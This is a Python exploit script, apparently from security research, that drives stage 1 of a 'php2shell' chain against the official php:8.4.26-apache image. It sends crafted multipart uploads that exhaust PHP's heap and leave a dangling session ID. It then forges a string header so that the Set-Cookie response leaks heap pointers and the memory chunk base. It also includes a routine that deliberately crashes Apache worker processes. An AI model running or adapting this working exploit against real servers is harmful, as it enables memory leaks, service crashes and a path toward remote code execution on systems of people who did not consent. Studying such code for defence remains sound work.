#!/usr/bin/env python3
"""php2shell on a STOCK php:8.4.26-apache worker - network-only chain driver.

Target: official php:8.4.26-apache (compiled defaults, NO php.ini):
memory_limit=128M, post_max_size=8M, display_errors=On, single-worker prefork.

Stage 1 (heap leak) implemented here:
  A  amplified OOM: a duplicate-part-header fill ("X: a" lines inside the file
     part's header block) spends 128M of PHP heap for ~2.58 MB of wire
     (314 B heap per 6 B wire).  The OOM lands inside
     php_session_reset_id -> php_url_encode, which leaves
     PS(id) pointing at a freed 32-byte zend_string (page 125 + 0xf80 of the
     Zend-MM chunk) and PS(send_cookie)=1 for the next request.
  B  no file part -> MULTIPART_EVENT_END -> php_session_rfc1867_cleanup ->
     php_session_initialize() with the stale PS(id):
       * a "plant" field whose value zend_string is allocated so that it covers
         the stale id block and writes a forged zend_string header at it
         (gc rc=2, len=0x1000).  The value's data ends one byte past the
         forged header, so PS(id)[0] is non-zero (the "create a new id" branch
         is skipped) and the bytes after it are stale heap.
       * the final part's header block carries ~230k "X: a" lines.  They stay
         alive until MULTIPART_EVENT_END (the header llist is destroyed only
         after the callback) and consume the main chunk plus all 31 cached
         chunks of the 128M heap, so the chunk that still holds the stale
         PS(mod_data) ps_files is reclaimed and its page becomes an SRUN page -
         ps_close_files() can then free the stale struct instead of panicking.
       * reset_id() url-encodes 0x1000 bytes starting at PS(id)+0x18 into
         Set-Cookie -> heap pointers.
  The cookie is decoded and the 2 MB-aligned Zend MM chunk base is recovered.

All traffic is plain HTTP to a lab-local target.  The A/B heap geometry is
calibrated for the official php:8.4.26-apache image (Debian bookworm,
Apache 2.4.69); re-calibrate with --a-n / --pre / --plant-* / --walk if the
image changes.

Lineage: the A/B mechanism follows public php2shell research; the
implementation was written from documented behavior and our own lab
measurements. The 128M adaptation, the amplified header fill and the stock B
geometry are this repo's work.
"""
from __future__ import annotations

import argparse
import re
import socket
import struct
import sys
import time
import urllib.parse

# ---- calibrated constants (stock php:8.4.26-apache, 128M heap) -------------
A_S = 64            # bin-128 drain fields
A_N = 427458        # duplicate header lines in the file part header block
A_NLEN = 8          # file-part name length
A_FLEN = 8          # file-part filename length
A_LIVE64 = 63       # live bin-64 seeds (places PS(id) at chunk page 125 + 0xf80)
B_PRE = 7           # 3968-byte pre fields (page trimmers)
B_PRE_LEN = 3968
B_PLANT_LEN = 8065  # plant body: 2-page zend_string, data ends 1B past the forge
B_PLANT_OFF = 0x1f68
B_FORGE_GC = 0x0000000600000002   # rc=2 (release is a no-op), IS_STRING
B_FORGE_LEN = 0x1000
B_WALK = 230000     # "X: a" header lines: exhaust main + 31 cached chunks
ID_PAGE = 125       # PS(id) page inside the chunk (A calibration)
ID_OFF = 0xF80      # PS(id) offset inside the page
MAX_CMD = 14

ABND = b'S' * 17
BBND = b'B' * 17


def _pad(prefix: str, i: int, n: int) -> str:
    s = "%s%04d" % (prefix, i)
    return (s + "x" * n)[:n]


def _post(host: str, port: int, path: str, body: bytes, boundary: bytes,
          read_cap: int, timeout: float, extra_headers: bytes = b"") -> bytes:
    req = (("POST %s HTTP/1.1\r\nHost: %s:%d\r\n" %
            (path, host, port)).encode() + extra_headers +
           ("Content-Type: multipart/form-data; boundary=%s\r\n"
            "Content-Length: %d\r\nConnection: close\r\n\r\n" %
            (boundary.decode(), len(body))).encode())
    s = socket.create_connection((host, port), timeout=timeout)
    s.settimeout(timeout)
    out = bytearray()
    try:
        s.sendall(req + body)
        while len(out) < read_cap:
            c = s.recv(65536)
            if not c:
                break
            out += c
    except OSError:
        pass
    s.close()
    return bytes(out)


# --------------------------------------------------------------------------
# stage A: A-shape stage with the big field replaced by the duplicate-header fill
# --------------------------------------------------------------------------
def build_a(s: int = A_S, n: int = A_N, nlen: int = A_NLEN, flen: int = A_FLEN,
            live64: int = A_LIVE64, fn: str = "f", path_fn: str = "") -> bytes:
    parts = []  # (name, filename|None, data, extra_hdr)
    for i in range(s):
        parts.append((_pad("g", i, 103), None, b"v" * 8, b""))
    for i in range(live64):
        parts.append(("L%04d" % i, None, b"K" * 39, b""))
    parts.append(("PHPSESSID", None, b"\x00", b""))
    parts.append(("PHP_SESSION_UPLOAD_PROGRESS", None, b"pwn", b""))
    fill = (b"X: a\r\n") * n
    fname = ("A" * (flen - 4) + ".txt").encode()
    cd = (b'Content-Disposition: form-data; name="' + fn.encode() +
          b'"; filename="' + fname + b'"\r\n'
          b"Content-Type: application/octet-stream\r\n")
    parts.append((fn, fname.decode(), b"A" * 64, cd + fill))
    o = bytearray()
    for name, filename, data, extra in parts:
        o += b"--" + ABND + b"\r\n"
        if extra:
            o += extra
        elif filename is not None:
            o += (b'Content-Disposition: form-data; name="' + name.encode() +
                  b'"; filename="' + filename.encode() + b'"\r\n'
                  b'Content-Type: application/octet-stream\r\n')
        else:
            o += b'Content-Disposition: form-data; name="' + name.encode() + b'"\r\n'
        o += b"\r\n" + data + b"\r\n"
    o += b"--" + ABND + b"--\r\n"
    return bytes(o)


# --------------------------------------------------------------------------
# stage B: plant + cache walk (stage-1 leak)
# --------------------------------------------------------------------------
def build_b(pre: int = B_PRE, pre_len: int = B_PRE_LEN,
            plant_len: int = B_PLANT_LEN, plant_off: int = B_PLANT_OFF,
            forge_gc: int = B_FORGE_GC, forge_len: int = B_FORGE_LEN,
            walk: int = B_WALK, sid: bytes = b"attacksessionid0001") -> bytes:
    parts = []
    for i in range(pre):
        tag = b"P%03d" % (i % 1000)
        parts.append(("P%04d" % i, (tag + b"Q" * pre_len)[:pre_len], None))
    body = bytearray((b"GP" + b"G" * plant_len)[:plant_len])
    struct.pack_into("<Q", body, plant_off + 0, forge_gc)     # gc: rc=2
    struct.pack_into("<Q", body, plant_off + 8, 0)            # h
    struct.pack_into("<Q", body, plant_off + 16, forge_len)   # len
    parts.append(("GP", bytes(body), None))
    parts.append(("PHPSESSID", sid, None))
    parts.append(("PHP_SESSION_UPLOAD_PROGRESS", b"pwn", None))
    hdr = (b'Content-Disposition: form-data; name="w1"\r\n' +
           b"X: a\r\n" * walk + b"\r\n")
    parts.append(("w1", b"1", hdr))
    o = bytearray()
    for name, data, hb in parts:
        o += b"--" + BBND + b"\r\n"
        if hb is not None:
            o += hb
        else:
            o += b'Content-Disposition: form-data; name="' + name.encode() + b'"\r\n'
        o += b"\r\n" + data + b"\r\n"
    o += b"--" + BBND + b"--\r\n"
    return bytes(o)


def build_b_min() -> bytes:
    """Minimal B: two session fields and one 1-byte part.  The END event runs
    php_session_initialize() with the stale PS(id)/PS(mod_data); freeing the
    stale ps_files aborts the child (fresh worker for the next attempt)."""
    parts = [("PHPSESSID", b"attacksessionid0001"),
             ("PHP_SESSION_UPLOAD_PROGRESS", b"pwn"),
             ("w1", b"1")]
    o = bytearray()
    for name, data in parts:
        o += b"--" + BBND + b"\r\n"
        o += b'Content-Disposition: form-data; name="' + name.encode() + b'"\r\n\r\n'
        o += data + b"\r\n"
    o += b"--" + BBND + b"--\r\n"
    return bytes(o)


def parse_cookie(resp: bytes) -> bytes:
    head = resp.split(b"\r\n\r\n", 1)[0]
    m = re.search(rb"Set-Cookie: PHPSESSID=([^\r\n]*)", head)
    return m.group(1) if m else b""


def decode_pointers(cookie: bytes) -> tuple[list[int], int]:
    """url-decode the leaked cookie; return (chunk-relative pointers, chunk base)."""
    dec = urllib.parse.unquote_to_bytes(cookie.decode("latin1"))
    ptrs = []
    for off in range(0, len(dec) - 7, 8):
        v = struct.unpack_from("<Q", dec, off)[0]
        if 0x0000010000000000 <= v < 0x0100000000000000 and (v & 7) == 0:
            ptrs.append(v)
    if not ptrs:
        return [], 0
    bases = {}
    for v in ptrs:
        b = v & ~0x1FFFFF
        bases[b] = bases.get(b, 0) + 1
    base = max(bases.items(), key=lambda kv: kv[1])[0]
    return ptrs, base


class Chain:
    def __init__(self, host: str, port: int, path: str, timeout: float = 60.0,
                 verbose: bool = True):
        self.host = host
        self.port = port
        self.path = path
        self.timeout = timeout
        self.verbose = verbose

    def log(self, msg: str) -> None:
        if self.verbose:
            print(msg, flush=True)

    def post(self, body: bytes, boundary: bytes, read_cap: int = 1 << 20,
             timeout: float | None = None) -> bytes:
        return _post(self.host, self.port, self.path, body, boundary,
                     read_cap, timeout or self.timeout)

    # ---- A ----
    def send_a(self, **kw) -> bytes:
        body = build_a(**kw)
        return self.post(body, ABND, read_cap=1 << 20, timeout=max(120.0, self.timeout))

    # ---- worker rotation ----
    def rotate(self) -> None:
        """Crash the current prefork child over HTTP: arm the stale session
        state with A, then let a minimal END-event session init free a stale
        ps_files whose chunk is no longer live (zend_mm panic -> SIGABRT).
        Apache then forks a fresh child with a virgin heap."""
        self.send_a()
        time.sleep(0.2)
        self.post(build_b_min(), BBND, read_cap=1 << 16, timeout=20.0)
        time.sleep(0.35)

    # ---- stage 1 ----
    def stage1(self, a_kw: dict | None = None, b_kw: dict | None = None,
               retries: int = 6) -> tuple[int, bytes, int]:
        for attempt in range(1, retries + 1):
            self.rotate()
            self.log("[*] stage1 attempt %d: A" % attempt)
            self.send_a(**(a_kw or {}))
            time.sleep(0.15)
            self.log("[*] stage1 attempt %d: B" % attempt)
            body = build_b(**(b_kw or {}))
            resp = self.post(body, BBND, read_cap=1 << 20,
                             timeout=max(240.0, self.timeout))
            cookie = parse_cookie(resp)
            ptrs, base = decode_pointers(cookie)
            self.log("    resp=%d cookie=%d pointers=%d chunk_base=%#x" %
                     (len(resp), len(cookie), len(ptrs), base))
            if base:
                return base, cookie, len(ptrs)
        return 0, b"", 0


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("-u", "--url", default="http://127.0.0.1:8090/index.php")
    ap.add_argument("--repeat", type=int, default=1, help="stage-1 attempts to run (N/N)")
    ap.add_argument("--a-n", type=int, default=A_N)
    ap.add_argument("--walk", type=int, default=B_WALK)
    ap.add_argument("--pre", type=int, default=B_PRE)
    ap.add_argument("--quiet", action="store_true")
    a = ap.parse_args(argv)
    u = urllib.parse.urlsplit(a.url)
    ch = Chain(u.hostname or "127.0.0.1", u.port or 80, u.path or "/",
               verbose=not a.quiet)
    ok = 0
    for i in range(a.repeat):
        base, cookie, nptrs = ch.stage1({"n": a.a_n}, {"walk": a.walk, "pre": a.pre})
        if base:
            ok += 1
            print("LEAK %d/%d chunk_base=0x%x pointers=%d" % (i + 1, a.repeat, base, nptrs))
        else:
            print("LEAK %d/%d FAILED" % (i + 1, a.repeat))
    print("STAGE1 %d/%d" % (ok, a.repeat))
    return 0 if ok == a.repeat else 1


if __name__ == "__main__":
    sys.exit(main())
